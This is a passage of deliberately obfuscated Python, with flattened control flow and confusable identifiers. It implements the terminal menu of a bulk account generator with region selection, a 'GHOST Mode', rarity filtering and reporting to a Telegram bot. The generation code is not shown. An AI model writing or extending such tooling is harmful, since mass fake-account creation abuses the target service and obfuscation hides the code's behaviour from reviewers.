            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}Mythic    {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}:{getattr(IlIIIIIIlIIlIlll, 'RST')} {getattr(IlIIIIIIlIIlIlll, 'BOLD')}{getattr(IlIIIIIIlIIlIlll, 'ORANGE_GLOW')}{lIIIllIlIIllllIIIlIIllI}{getattr(IlIIIIIIlIIlIlll, 'RST')} (Score 15-19){getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            lllIlIlIlllIllIIllIl = 3028040
            continue
        if lllIlIlIlllIllIIllIl == 6848545:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}{center_text_alt(IIlIIIIllllIIllI, IIIIllllllIlIlIllIIIIlI)}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            lllIlIlIlllIllIIllIl = 8183317
            continue
        if lllIlIlIlllIllIIllIl == 7396412:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}{center_text_simple(f'{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}✦ GENERATION COMPLETE ✦{getattr(IlIIIIIIlIIlIlll, 'RST')}', IIIIllllllIlIlIllIIIIlI)}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            lllIlIlIlllIllIIllIl = 9660897
            continue
        if lllIlIlIlllIllIIllIl == 7780414:
            lIIlIllIIlIlIIlIl = getattr(IlllllIIllIIllIIll, 'time')()
            lllIlIlIlllIllIIllIl = 5917165
            continue
        if lllIlIlIlllIllIIllIl == 7770241:
            lIIIIIlIlIIIIlIlIIlIlI = 0
            lllIlIlIlllIllIIllIl = 6251134
            continue
        if lllIlIlIlllIllIIllIl == 1988436:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}{center_text_simple(f'{getattr(IlIIIIIIlIIlIlll, 'RED_GLOW')}⚡ GENERATING ACCOUNTS ⚡{getattr(IlIIIIIIlIIlIlll, 'RST')}', IIIIllllllIlIlIllIIIIlI)}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            lllIlIlIlllIllIIllIl = 1046934
            continue
        if lllIlIlIlllIllIIllIl == 2118534:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}{center_text_alt(lllIllIlIlIIIl, IIIIllllllIlIlIllIIIIlI)}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            lllIlIlIlllIllIIllIl = 1539272
            continue
        if lllIlIlIlllIllIIllIl == 5515602:
            print(f'\n{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╔{'═' * IIIIllllllIlIlIllIIIIlI}╗')
            lllIlIlIlllIllIIllIl = 7396412
            continue
        if lllIlIlIlllIllIIllIl == 7725862:
            input(f'\n{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}Press Enter to continue...{getattr(IlIIIIIIlIIlIlll, 'RST')}')
            break
        if lllIlIlIlllIllIIllIl == 4007022:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}10{getattr(IlIIIIIIlIIlIlll, 'RST')}. {getattr(IlIIIIIIlIIlIlll, 'GREEN2')}SAC (es)    {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}│{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'PURPLE_GLOW')}11{getattr(IlIIIIIIlIIlIlll, 'RST')}. {getattr(IlIIIIIIlIIlIlll, 'PURPLE')}GHOST Mode {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}│{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'RED_GLOW')}00{getattr(IlIIIIIIlIIlIlll, 'RST')}. {getattr(IlIIIIIIlIIlIlll, 'RED1')}Back    {getattr(IlIIIIIIlIIlIlll, 'BLACK')}──────────────────╢.   {getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            lllIlIlIlllIllIIllIl = 9698639
            continue
        if lllIlIlIlllIllIIllIl == 8240324:
            lIlIIIlIllIIIllllIllI = '🟢 ONLINE' if IIIlIlllIIllllIllIllIll else '🔴 OFFLINE'
            lllIlIlIlllIllIIllIl = 1672521
            continue
        if lllIlIlIlllIllIIllIl == 3254770:
            load_license()
            lllIlIlIlllIllIIllIl = 4541084
            continue
        if lllIlIlIlllIllIIllIl == 6349821:
            print(f'\n{getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}⏳ menyimpan data...{getattr(IlIIIIIIlIIlIlll, 'RST')}')
            lllIlIlIlllIllIIllIl = 3197105
            continue
        if lllIlIlIlllIllIIllIl == 1680018:
            IlIllIIllIIIlIlll = getattr(IlllllIIllIIllIIll, 'time')() - lIIlIllIIlIlIIlIl
            lllIlIlIlllIllIIllIl = 5515602
            continue
        if lllIlIlIlllIllIIllIl == 5707619:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}{center_text_simple(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}🤖 Telegram: {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}CONNECTED{getattr(IlIIIIIIlIIlIlll, 'RST')}', IIIIllllllIlIlIllIIIIlI)}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            lllIlIlIlllIllIIllIl = 3394716
            continue
        if lllIlIlIlllIllIIllIl == 4541084:
            get_runtime_config()
            lllIlIlIlllIllIIllIl = 7335243
            continue
        if lllIlIlIlllIllIIllIl == 6480931:
            IllIIIlIlIIIlIllIIlIlIlI = f'  {getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}Region    {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}:{getattr(IlIIIIIIlIIlIlll, 'RST')} {getattr(IlIIIIIIlIIlIlll, 'GREEN2')}{('GHOST MODE' if lIlIlIIlIIlllIIIIlI else IlllIIIIIllIIllII):<15}{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}│{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}Target    {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}:{getattr(IlIIIIIIlIIlIlll, 'RST')} {getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}{lIIllIlllIIIlIIIlIlIIll}{getattr(IlIIIIIIlIIlIlll, 'RST')} accounts'
            lllIlIlIlllIllIIllIl = 9519587
            continue
        if lllIlIlIlllIllIIllIl == 4468288:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}Generated {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}:{getattr(IlIIIIIIlIIlIlll, 'RST')} {getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}{lIIlIIllllIIlII}{getattr(IlIIIIIIlIIlIlll, 'RST')}/{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}{lIIllIlllIIIlIIIlIlIIll}{getattr(IlIIIIIIlIIlIlll, 'RST')} accounts{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            lllIlIlIlllIllIIllIl = 1515430
            continue
        if lllIlIlIlllIllIIllIl == 8754690:
            lIIllIIlIIIIIllllllIII = IllIIIIIIIIIIIlII()
            lllIlIlIlllIllIIllIl = 7780414
            continue
        if lllIlIlIlllIllIIllIl == 6299973:
            setattr(IIllIlIIIIIIIIl, 'mythic_list', [])
            lllIlIlIlllIllIIllIl = 6651628
            continue
        if lllIlIlIlllIllIIllIl == 9651941:
            setattr(IIllIlIIIIIIIIl, 'total_legendary', 0)
            lllIlIlIlllIllIIllIl = 5501104
            continue
        if lllIlIlIlllIllIIllIl == 9456973:
            while True:
                try:
                    print(f'\n{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}╔{'═' * IIIIllllllIlIlIllIIIIlI}╗')
                    print(f'{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}{center_text_simple(f'{getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}🎯 TOTAL ACCOUNTS{getattr(IlIIIIIIlIIlIlll, 'RST')}', IIIIllllllIlIlIllIIIIlI)}{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}')
                    print(f'{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}╚{'═' * IIIIllllllIlIlIllIIIIlI}╝')
                    lIIllIlllIIIlIIIlIlIIll = int(input(f'\n{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}{getattr(UI, 'ARROW')}{getattr(IlIIIIIIlIIlIlll, 'RST')} Total Accounts: {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}'))
                    print(getattr(IlIIIIIIlIIlIlll, 'RST'), end='')
                    if lIIllIlllIIIlIIIlIlIIll > 0:
                        break
                except ValueError:
                    print(f'{getattr(IlIIIIIIlIIlIlll, 'RED1')}{getattr(UI, 'CROSS')}{getattr(IlIIIIIIlIIlIlll, 'RST')} Enter number')
                except KeyboardInterrupt:
                    IlIIlIlIlIIIIllIllIIll()
            lllIlIlIlllIllIIllIl = 2953280
            continue
        if lllIlIlIlllIllIIllIl == 5386013:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'BLUE_GLOW')}01{getattr(IlIIIIIIlIIlIlll, 'RST')}. {getattr(IlIIIIIIlIIlIlll, 'BLUE')}ME (ar)     {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}│{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'BLUE_GLOW')}02{getattr(IlIIIIIIlIIlIlll, 'RST')}. {getattr(IlIIIIIIlIIlIlll, 'BLUE')}IND (hi)   {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}│{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'BLUE_GLOW')}03{getattr(IlIIIIIIlIIlIlll, 'RST')}. {getattr(IlIIIIIIlIIlIlll, 'BLUE')}ID (id) {getattr(IlIIIIIIlIIlIlll, 'BLACK')}───────────────────╢   {getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            lllIlIlIlllIllIIllIl = 2667295
            continue
        if lllIlIlIlllIllIIllIl == 8183317:
            lllIllIlIlIIIl = f'  {getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}Version   {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}:{getattr(IlIIIIIIlIIlIlll, 'RST')} {getattr(IlIIIIIIlIIlIlll, 'GREEN2')}9.0 TELEGRAM{'      '}{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}│{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}Symbols   {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}:{getattr(IlIIIIIIlIIlIlll, 'RST')} {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}{len(IllIlllllIIlllllIlIIll)}+{getattr(IlIIIIIIlIIlIlll, 'RST')} unique'
            lllIlIlIlllIllIIllIl = 2118534
            continue
        if lllIlIlIlllIllIIllIl == 2507696:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}{center_text_simple(f'{getattr(IlIIIIIIlIIlIlll, 'TEXT_DIM')}🌐 Koneksi: {IIlIIllIlIIIllIlIl}{lIlIIIlIllIIIllllIllI}{getattr(IlIIIIIIlIIlIlll, 'RST')} {status}{getattr(IlIIIIIIlIIlIlll, 'RST')}', IIIIllllllIlIlIllIIIIlI)}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            lllIlIlIlllIllIIllIl = 5707619
            continue
        if lllIlIlIlllIllIIllIl == 1046934:
            status, _, IIIlIlllIIllllIllIllIll = getattr(lIlIlIIllllllllllIlII, 'get_status')()
            lllIlIlIlllIllIIllIl = 8240324
            continue
        if lllIlIlIlllIllIIllIl == 1110792:
            normal = 0
            lllIlIlIlllIllIIllIl = 8754690
            continue
        if lllIlIlIlllIllIIllIl == 1539272:
            lllllllllllIlIIlIIlIIIl = f'  {getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}Mode      {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}:{getattr(IlIIIIIIlIIlIlll, 'RST')} {(getattr(IlIIIIIIlIIlIlll, 'RED_GLOW') if llllIIllllllIlllII else getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW'))}{('RARE ONLY' if llllIIllllllIlllII else 'ALL ACCOUNTS')}{'          '}{getattr(IlIIIIIIlIIlIlll, 'RST')}'
            lllIlIlIlllIllIIllIl = 2808040
            continue
        if lllIlIlIlllIllIIllIl == 7651409:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}🔄 Auto-Loop: {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}ACTIVE{getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            lllIlIlIlllIllIIllIl = 5750500
            continue
        if lllIlIlIlllIllIIllIl == 2808040:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}{center_text_alt(lllllllllllIlIIlIIlIIIl, IIIIllllllIlIlIllIIIIlI)}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            lllIlIlIlllIllIIllIl = 5013635
            continue
        if lllIlIlIlllIllIIllIl == 8712876:
            print(f'\n{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}╔{'═' * IIIIllllllIlIlIllIIIIlI}╗')
            lllIlIlIlllIllIIllIl = 1605926
            continue
        if lllIlIlIlllIllIIllIl == 1971731:
            setattr(IIllIlIIIIIIIIl, 'start_time', getattr(IlllllIIllIIllIIll, 'time')())
            lllIlIlIlllIllIIllIl = 9571685
            continue
        if lllIlIlIlllIllIIllIl == 4842933:
            if not getattr(IIllIlIIIIIIIIl, 'connected'):
                llIllIlIlIIlIIlllIIlIIl = 1117803
                while True:
                    if llIllIlIlIIlIIlllIIlIIl == 1117803:
                        print(f'{getattr(IlIIIIIIlIIlIlll, 'RED1')}❌ Telegram belum terhubung! Silakan setup terlebih dahulu.{getattr(IlIIIIIIlIIlIlll, 'RST')}')
                        llIllIlIlIIlIIlllIIlIIl = 3750421
                        continue
                    if llIllIlIlIIlIIlllIIlIIl == 2114297:
                        llIllIlIlIIlIIlllIIlIIl = 2114297
                        continue
                    if llIllIlIlIIlIIlllIIlIIl == 1462654:
                        return
                        break
                    if llIllIlIlIIlIIlllIIlIIl == 3750421:
                        getattr(IlllllIIllIIllIIll, 'sleep')(2)
                        llIllIlIlIIlIIlllIIlIIl = 1462654
                        continue
            lllIlIlIlllIllIIllIl = 3254770
            continue
        if lllIlIlIlllIllIIllIl == 4093488:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}[{getattr(IlIIIIIIlIIlIlll, 'RED_GLOW')}2{getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}]{getattr(IlIIIIIIlIIlIlll, 'RST')} Rare Only (hanya Rare+){getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}')
            lllIlIlIlllIllIIllIl = 9827818
            continue
        if lllIlIlIlllIllIIllIl == 8040766:
            while True:
                try:
                    lllllllIIlllIllIIIlI = getattr(input(f'\n{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}{getattr(UI, 'ARROW')}{getattr(IlIIIIIIlIIlIlll, 'RST')} Choose region [1-11/00/000]: {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}'), 'strip')()
                    print(getattr(IlIIIIIIlIIlIlll, 'RST'), end='')
                    lIllIIlIIlIlllIlIlIIIl = {'1': 'ME', '2': 'IND', '3': 'ID', '4': 'VN', '5': 'TH', '6': 'BD', '7': 'PK', '8': 'TW', '9': 'CIS', '10': 'SAC'}
                    if lllllllIIlllIllIIIlI == '00':
                        return
                    elif lllllllIIlllIllIIIlI == '000':
                        IlIIlIlIlIIIIllIllIIll()
                    elif lllllllIIlllIllIIIlI == '11':
                        lIlIlIIlIIlllIIIIlI = True
                        IlllIIIIIllIIllII = 'BD'
                        print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}{getattr(UI, 'ARROW')}{getattr(IlIIIIIIlIIlIlll, 'RST')} {getattr(IlIIIIIIlIIlIlll, 'PURPLE_GLOW')}GHOST Mode Activated{getattr(IlIIIIIIlIIlIlll, 'RST')}')
                        break
                    elif lllllllIIlllIllIIIlI in lIllIIlIIlIlllIlIlIIIl:
                        IlllIIIIIllIIllII = lIllIIlIIlIlllIlIlIIIl[lllllllIIlllIllIIIlI]
                        print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}{getattr(UI, 'ARROW')}{getattr(IlIIIIIIlIIlIlll, 'RST')} Selected: {getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}{IlllIIIIIllIIllII}{getattr(IlIIIIIIlIIlIlll, 'RST')}')
                        break
                    else:
                        print(f'{getattr(IlIIIIIIlIIlIlll, 'RED1')}{getattr(UI, 'CROSS')}{getattr(IlIIIIIIlIIlIlll, 'RST')} Invalid option')
                except KeyboardInterrupt:
                    IlIIlIlIlIIIIllIllIIll()
            lllIlIlIlllIllIIllIl = 8712876
            continue
        if lllIlIlIlllIllIIllIl == 2667295:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}04{getattr(IlIIIIIIlIIlIlll, 'RST')}. {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}VN (vi)     {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}│{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}05{getattr(IlIIIIIIlIIlIlll, 'RST')}. {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}TH (th)    {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}│{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}06{getattr(IlIIIIIIlIIlIlll, 'RST')}. {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}BD (bn)  {getattr(IlIIIIIIlIIlIlll, 'BLACK')}───────────────────╢  {getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            lllIlIlIlllIllIIllIl = 6637806
            continue
        if lllIlIlIlllIllIIllIl == 5013635:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╚{'═' * IIIIllllllIlIlIllIIIIlI}╝')
            lllIlIlIlllIllIIllIl = 6023682
            continue
        if lllIlIlIlllIllIIllIl == 4558906:
            lIIlIIllllIIlII = 0
            lllIlIlIlllIllIIllIl = 9942767
            continue
        if lllIlIlIlllIllIIllIl == 6023682:
            getattr(lIlIlIIllllllllllIlII, 'start')()
            lllIlIlIlllIllIIllIl = 1693056
            continue
        if lllIlIlIlllIllIIllIl == 9571685:
            setattr(IIllIlIIIIIIIIl, 'region', IlllIIIIIllIIllII)
            lllIlIlIlllIllIIllIl = 8046480
            continue
        if lllIlIlIlllIllIIllIl == 2910009:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╟{'─' * IIIIllllllIlIlIllIIIIlI}')
            lllIlIlIlllIllIIllIl = 5386013
            continue
        if lllIlIlIlllIllIIllIl == 7335243:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╔{'═' * IIIIllllllIlIlIllIIIIlI}╗')
            lllIlIlIlllIllIIllIl = 3917988
            continue
        if lllIlIlIlllIllIIllIl == 5917165:
            lIlIlIIIlllIlll = __import__('concurrent.futures', fromlist=['ThreadPoolExecutor', 'as_completed'])
            IllIIIlIllllIIIIIIllI = getattr(lIlIlIIIlllIlll, 'ThreadPoolExecutor')
            lIlIlIlllIlllll = getattr(lIlIlIIIlllIlll, 'as_completed')
            lllIlIlIlllIllIIllIl = 8360998
            continue
        if lllIlIlIlllIllIIllIl == 5155689:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}📱 Chat ID: {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}{getattr(IIllIlIIIIIIIIl, 'bot_chat_id')}{getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            lllIlIlIlllIllIIllIl = 5831061
            continue
        if lllIlIlIlllIllIIllIl == 7290355:
            setattr(IIllIlIIIIIIIIl, 'legendary_list', [])
            lllIlIlIlllIllIIllIl = 1541051
            continue
        if lllIlIlIlllIllIIllIl == 4900631:
            IlllIIIIIllIIllII = None
            lllIlIlIlllIllIIllIl = 1711046
            continue
        if lllIlIlIlllIllIIllIl == 2021350:
            getattr(IIllIlIIIIIIIIl, 'send_summary')()
            lllIlIlIlllIllIIllIl = 9823062
            continue
        if lllIlIlIlllIllIIllIl == 5374060:
            get_runtime_config()
            lllIlIlIlllIllIIllIl = 1910591
            continue
        if lllIlIlIlllIllIIllIl == 4331844:
            lllIlIlIlllIllIIllIl = 4043198
            continue
        if lllIlIlIlllIllIIllIl == 3394716:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}{center_text_simple(f'{getattr(IlIIIIIIlIIlIlll, 'RED_GLOW')}🔄 Auto-Loop: {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}ACTIVE{getattr(IlIIIIIIlIIlIlll, 'RST')}', IIIIllllllIlIlIllIIIIlI)}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            lllIlIlIlllIllIIllIl = 5658710
            continue
        if lllIlIlIlllIllIIllIl == 9304674:
            while True:
                IllIIIlIIlIlllIIllIlIlII = getattr(input(f'\n{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}{getattr(UI, 'ARROW')}{getattr(IlIIIIIIlIIlIlll, 'RST')} Pilih mode [1/2]: {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}'), 'strip')()
                if IllIIIlIIlIlllIIllIlIlII == '1':
                    llllIIllllllIlllII = False
                    break
                elif IllIIIlIIlIlllIIllIlIlII == '2':
                    llllIIllllllIlllII = True
                    print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}✅ Rare Only aktif – hanya akun Rare+ yang akan disimpan{getattr(IlIIIIIIlIIlIlll, 'RST')}')
                    getattr(IlllllIIllIIllIIll, 'sleep')(1)
                    break
                else:
                    print(f'{getattr(IlIIIIIIlIIlIlll, 'RED1')}❌ Pilihan tidak valid{getattr(IlIIIIIIlIIlIlll, 'RST')}')
            lllIlIlIlllIllIIllIl = 7769385
            continue
        if lllIlIlIlllIllIIllIl == 1693056:
            print(f'\n{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╔{'═' * IIIIllllllIlIlIllIIIIlI}╗')
            lllIlIlIlllIllIIllIl = 1988436
            continue
        if lllIlIlIlllIllIIllIl == 8046480:
            setattr(IIllIlIIIIIIIIl, 'target', lIIllIlllIIIlIIIlIlIIll)
            lllIlIlIlllIllIIllIl = 9651941
            continue
        if lllIlIlIlllIllIIllIl == 6651628:
            getattr(IIllIlIIIIIIIIl, 'send_bot_on')()
            lllIlIlIlllIllIIllIl = 4558906
            continue
        if lllIlIlIlllIllIIllIl == 8529643:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╟{'─' * IIIIllllllIlIlIllIIIIlI}')
            lllIlIlIlllIllIIllIl = 6480931
            continue
        if lllIlIlIlllIllIIllIl == 8953355:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╚{'═' * IIIIllllllIlIlIllIIIIlI}╝')
            lllIlIlIlllIllIIllIl = 7725862
            continue
        if lllIlIlIlllIllIIllIl == 3596106:
            load_license()
            lllIlIlIlllIllIIllIl = 3119417
            continue
        if lllIlIlIlllIllIIllIl == 9942767:
            IIllllIIIlIlIIlIlIlll = 0
            lllIlIlIlllIllIIllIl = 7770241
            continue
        if lllIlIlIlllIllIIllIl == 6637806:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'CYAN_GLOW')}07{getattr(IlIIIIIIlIIlIlll, 'RST')}. {getattr(IlIIIIIIlIIlIlll, 'CYAN')}PK (ur)     {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}│{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'CYAN_GLOW')}08{getattr(IlIIIIIIlIIlIlll, 'RST')}. {getattr(IlIIIIIIlIIlIlll, 'CYAN')}TW (zh)    {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}│{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'CYAN_GLOW')}09{getattr(IlIIIIIIlIIlIlll, 'RST')}. {getattr(IlIIIIIIlIIlIlll, 'CYAN')}CIS (ru)  {getattr(IlIIIIIIlIIlIlll, 'BLACK')}───────────────────╢ {getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            lllIlIlIlllIllIIllIl = 4007022
            continue
        if lllIlIlIlllIllIIllIl == 3119417:
            get_runtime_config()
            lllIlIlIlllIllIIllIl = 3307807
            continue
        if lllIlIlIlllIllIIllIl == 1711046:
            lIlIlIIlIIlllIIIIlI = False
            lllIlIlIlllIllIIllIl = 8040766
            continue
        if lllIlIlIlllIllIIllIl == 4632768:
            lIlllIllIlllIIIl = 0
            lllIlIlIlllIllIIllIl = 1110792
            continue
        if lllIlIlIlllIllIIllIl == 2652128:
            lllIlIlIlllIllIIllIl = 4468288
            continue
        if lllIlIlIlllIllIIllIl == 5750500:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}📢 Kirim Legendary ke Telegram{getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            lllIlIlIlllIllIIllIl = 9773062
            continue
        if lllIlIlIlllIllIIllIl == 9519587:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}{center_text_alt(IllIIIlIlIIIlIllIIlIlIlI, IIIIllllllIlIlIllIIIIlI)}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            lllIlIlIlllIllIIllIl = 3392714
            continue
        if lllIlIlIlllIllIIllIl == 3197105:
            getattr(lIIlIIIIlIllII, 'stop')()
            lllIlIlIlllIllIIllIl = 2021350
            continue
        if lllIlIlIlllIllIIllIl == 6869470:
            if IlIllIIllIIIlIlll > 0 and lIIlIIllllIIlII > 0:
                IlIllIIIlllIIIIIIIlIl = lIIlIIllllIIlII / IlIllIIllIIIlIlll
                print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}Speed     {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}:{getattr(IlIIIIIIlIIlIlll, 'RST')} {getattr(IlIIIIIIlIIlIlll, 'RED_GLOW')}{IlIllIIIlllIIIIIIIlIl:.1f}{getattr(IlIIIIIIlIIlIlll, 'RST')} acc/sec{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            lllIlIlIlllIllIIllIl = 4740019
            continue
        if lllIlIlIlllIllIIllIl == 9660897:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╟{'─' * IIIIllllllIlIlIllIIIIlI}')
            lllIlIlIlllIllIIllIl = 4468288
            continue
        if lllIlIlIlllIllIIllIl == 9823062:
            getattr(IIllIlIIIIIIIIl, 'send_completion')()
            lllIlIlIlllIllIIllIl = 1680018
            continue

def show_saved_accounts():
    llIIIIlllIIlIllIlI = 3297617
    while True:
        if llIIIIlllIIlIllIlI == 8202978:

            def lllIIIIllllIIlI(label, value, color):
                IllIllllIIlIlIlIlIllIIl = 9659204
                while True:
                    if IllIllllIIlIlIlIlIllIIl == 7723236:
